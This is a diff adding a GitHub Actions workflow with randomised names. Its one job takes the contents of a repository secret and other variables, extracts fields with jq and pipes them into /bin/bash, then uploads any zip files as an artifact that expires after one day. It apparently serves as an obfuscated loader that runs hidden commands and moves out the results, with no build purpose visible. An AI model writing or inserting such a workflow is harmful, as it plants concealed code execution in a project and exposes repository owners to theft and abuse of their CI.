@@ -1,0 +1,26 @@
+name: vercelkv7676
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: vercelkv7676
+        env:
+          fucm0: ${{ secrets.fucm0 }}
+        run: |
+          printf '%s' "$fucm0" | jq -r .zb31220 | /bin/bash
+          printf '%s' "$jv6" | jq -r .bnjpr462 | /bin/bash
+          printf '%s' "$et69544" | jq -r .bw1722 | /bin/bash
+          printf '%s' "$e682" | jq -r .ik34 | /bin/bash
+          echo $kmckf2348 | jq -r .yd4 | /bin/bash
+          printf '%s' "$zxjs4113" | jq -r .l6685 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: gNwMPgKg
+          path: "*.zip"
+          retention-days: 1
